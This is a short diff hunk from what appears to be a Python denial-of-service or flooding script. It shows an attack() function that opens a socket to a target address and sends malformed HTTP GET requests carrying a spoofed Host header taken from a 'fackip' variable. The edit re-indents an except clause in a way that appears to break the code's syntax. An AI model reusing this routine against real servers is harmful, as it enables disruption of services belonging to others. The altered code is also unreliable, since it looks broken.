@@ -97,7 +97,8 @@ def attack():
    s.connect((ip , port))
    s.sendto(("GET /"+ip+"HTTP/1.1\r\n").encode("ascii"),(ip , port))
    s.sendto(("Host:"+fackip+"\r\n\r\n").encode("ascii"),(ip , port))
-  except gaierror:
+  
+except gaierror:
     print(f"{red} please Check Your Internet Connection {default}")
     exit()
 
